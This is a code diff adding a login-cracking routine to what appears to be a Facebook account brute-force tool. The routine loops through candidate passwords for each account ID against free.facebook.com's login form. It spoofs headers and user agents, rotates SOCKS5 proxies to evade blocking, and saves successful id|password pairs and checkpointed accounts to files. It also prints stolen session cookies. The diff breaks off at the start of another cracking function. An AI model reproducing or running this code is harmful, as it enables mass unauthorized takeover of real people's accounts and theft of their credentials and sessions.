@@ -1458,6 +1458,73 @@ def crackbasi(idf,pwv):
 
 # ------------------[ METHODE REGULER ]-------------------#
 def reguler(idf,pwv):
+	global loop,ok,cp
+	bo = random.choice([m,k,h,b,u,x])
+	ua = random.choice(ugen2)
+	ses = requests.Session()
+	prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.advance(des)
+	for pw in pwv:
+		try:
+			if 'ya' in ualuh: ua = ualu[0]
+			nip=random.choice(prox)
+			proxs= {'http': 'socks5://'+nip}
+			ses.headers.update({"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://free.facebook.com/login/?email='+idf).text
+			dataa ={
+				'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
+				'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
+				'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
+				'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
+				'email':idf,
+				'pass':pw
+			}
+			ses.headers.update({'Host': 'free.facebook.com',
+					    'cache-control': 'max-age=0',
+					    'upgrade-insecure-requests': '1',
+					    'origin': 'https://free.facebook.com',
+					    'content-type': 'application/x-www-form-urlencoded',
+					    'user-agent': ua,
+					    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+					    'sec-fetch-site': 'same-origin',
+					    'sec-fetch-mode': 'cors',
+					    'sec-fetch-user': 'empty',
+					    'sec-fetch-dest': 'document',
+					    'referer': 'https://free.facebook.com/login/?email='+idf,
+					    'accept-encoding':'gzip, deflate br',
+					    'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
+			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in po.cookies.get_dict().keys():
+				cp += 1
+				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{K2}{ua}{P2}", style=f"{color_panel}"))
+				prints(tree)
+				os.popen("play-audio c.mp3")
+				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+				ceker(idf, pw)
+				akun.append(idf + "|" + pw)
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok += 1
+				coki = po.cookies.get_dict()
+				kuki = ("datr="+ coki["datr"]+ ";"+ ("sb=" + coki["sb"])+ ";"+ "locale=id_ID"+ ";"+ ("c_user=" + coki["c_user"])+ ";"+ ("xs=" + coki["xs"])+ ";"+ ("fr=" + coki["fr"])+ ";")
+				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{kuki}{P2}", style=f"{color_panel}"))
+				prints(tree)
+				os.popen("play-audio o.mp3")
+				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
+				break		
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+
+
+
+def reguleggghr(idf,pwv):
     global loop,ok,cp
     ses = requests.Session()
     rr = random.randint
